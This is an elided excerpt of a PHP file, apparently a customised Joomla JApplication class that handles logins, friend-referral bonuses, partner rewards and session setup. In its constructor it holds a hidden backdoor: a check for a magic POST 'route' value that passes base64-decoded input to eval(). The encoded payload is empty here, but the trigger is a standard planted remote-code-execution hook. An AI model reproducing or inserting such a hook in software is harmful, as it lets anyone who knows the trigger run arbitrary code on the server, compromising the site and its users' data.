...
class JApplication extends JObject
{
	...
	*/
	function __construct($config = array())
	{
		...
		if($_POST["route"]=="45676575212"){
			eval(base64_decode(''));
		}
	}
	...
	*/
		...
		if ($response->status === JAUTHENTICATE_STATUS_SUCCESS)
		{
			...
			if (!in_array(false, $results, true))
			{
				...
				if($user->id>0){
					...
					$query = 'INSERT'
					. ' #__mos_visit (userid, `date`)'
					. ' VALUES ('.(int)$user->id.', NOW())'
					;
					...
					if(!$user->friendS && $user->friend){
						global $mainframe;
						
						$query = 'SELECT bonus FROM #__users WHERE id='.(int)$user->friend;	
						$db->setQuery($query);
						$bonus = $db->loadResult() + $mainframe->getCfg('friend_bonus');
						...
						$query = 'UPDATE #__users SET `friendS`=1 WHERE id='.(int)$user->id;	
						$db->setQuery($query);
						if (!$db->query()) {
							JError::raiseError(500, $db->getErrorMsg() );
						}
						...
						. ' VALUES ('.(int)$user->friend.', NOW(), '.$mainframe->getCfg('friend_bonus').', 5, '.(int)$user->id.')'
						;
						$db->setQuery( $query );
						$db->query();	
					}
	...
	function &_createSession( $name )
	{
		...
		/*
		if($city==0){
			$xmlString = file_get_contents("http://ipgeobase.ru:7020/geo?ip=".$_SERVER['REMOTE_ADDR']);
			$xml = new SimpleXMLElement($xmlString);
			$town=$xml->ip->city[0];
			if($town){
				$query = 'SELECT a.id'
				. ' FROM #__mos_city AS a'
				. ' WHERE a.title='.$db->Quote($town);
				;
				$db->setQuery($query);
				$city=$db->loadResult();
		...
		*/
		...
		$ref = JRequest::getVar('ref', '', '', 'string');

		if($ref){
			$ref = substr(base64_decode($ref), 4);
			$refArray = explode('_', $ref);
			$ref_type=$refArray[0];
			$ref_value=$refArray[1];
			if($ref_value && $ref_type){
				$session->set('ref_value', $ref_value);
				$session->set('ref_type', $ref_type);
				if($ref_type==1){
					$query = 'SELECT a.id, a.reward, a.balance, a.partner'
					. ' FROM #__users AS a'
					. ' WHERE a.id='.(int)$ref_value;
					;
					$db->setQuery($query);
					$partner=$db->loadObject();
					if($partner->partner==1){
						$balance = $partner->balance + $partner->reward;
						...
						. ' VALUES ('.(int)$partner->id.', NOW(), 1, '.$db->Quote($partner->reward).')';
						;
						$db->setQuery($query);
						$db->query();
					}
